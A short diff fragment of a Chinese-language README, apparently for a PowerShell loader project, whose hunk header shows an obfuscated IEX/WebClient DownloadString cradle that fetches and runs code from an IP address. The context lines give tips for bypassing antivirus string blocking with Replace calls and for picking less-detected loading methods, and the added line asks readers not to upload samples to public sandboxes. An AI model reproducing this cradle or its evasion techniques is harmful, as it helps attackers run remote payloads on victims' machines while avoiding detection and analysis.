@@ -248,6 +248,8 @@ IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@
 ## 3.0x02的加载方式显然比较稳定，比起webclient，WebRequest相对特征不那么明显，因此每种加载方式都有优劣之处
 ## 4.当powershell进程中出现某个字符串被禁用时，多使用几个Replace函数去替换去混淆，在一定程度上可以做到动态绕过的效果
 
+# 请不要将样本上传至公网沙箱，谢谢
+
 # 微信联系
 
 ![092085746420d71c94b43382d755b60](https://user-images.githubusercontent.com/89376703/155832064-cd2f60f1-51a7-402c-b957-8c8ca1568095.jpg)
